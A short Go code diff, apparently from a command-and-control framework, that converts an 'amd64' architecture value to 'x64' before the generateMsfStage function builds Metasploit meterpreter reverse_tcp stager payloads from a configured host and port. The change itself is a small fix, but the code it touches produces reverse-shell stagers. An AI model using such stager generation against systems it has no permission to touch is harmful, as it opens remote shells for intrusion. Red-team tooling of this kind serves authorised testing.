@@ -87,7 +87,16 @@ func generateMsfStage(config *clientpb.EggConfig) ([]byte, error) {
 		stage   []byte
 		payload string
 		options []string
+		arch    string
 	)
+
+	switch config.Arch {
+	case "amd64":
+		arch = "x64"
+	default:
+		arch = "x86"
+	}
+
 	switch config.Protocol {
 	case clientpb.EggConfig_TCP:
 		payload = "meterpreter/reverse_tcp"
@@ -106,7 +115,7 @@ func generateMsfStage(config *clientpb.EggConfig) ([]byte, error) {
 		Payload: payload,
 		LHost:   config.Host,
 		LPort:   uint16(config.Port),
-		Arch:    config.Arch,
+		Arch:    arch,
 		Options: options,
 		// TODO: add an encoder if required
 	}
